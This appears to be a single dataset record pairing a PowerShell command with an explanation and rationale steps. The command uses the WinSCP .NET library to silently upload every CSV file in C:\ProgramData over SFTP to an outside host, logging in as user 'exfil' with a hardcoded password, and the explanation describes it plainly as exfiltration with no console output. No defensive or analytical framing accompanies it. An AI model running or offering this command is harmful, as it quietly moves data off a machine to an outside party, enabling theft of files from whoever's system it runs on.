command: [Reflection.Assembly]::LoadFile('C:\Program Files (x86)\WinSCP\WinSCPnet.dll') | Out-Null; $so=New-Object WinSCP.SessionOptions -Property @{ Protocol=[WinSCP.Protocol]::Sftp; HostName='192.0.2.10'; UserName='exfil'; Password='S3cr3t!'; SshHostKeyFingerprint='ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }; $s=New-Object WinSCP.Session; $s.Open($so); $to=New-Object WinSCP.TransferOptions; $to.ResumeSupport.State=[WinSCP.TransferResumeSupportState]::On; $s.PutFiles('C:\ProgramData\*.csv','/data/',$false,$to) | Out-Null; $s.Dispose() 2>$null
explanation: Uses the WinSCP .NET assembly from PowerShell to programmatically exfiltrate CSV files over SFTP with resume support and no console output.
rationale_steps: Create session options with host key pinning
Open session and configure transfer options
Upload matching files and dispose session silently
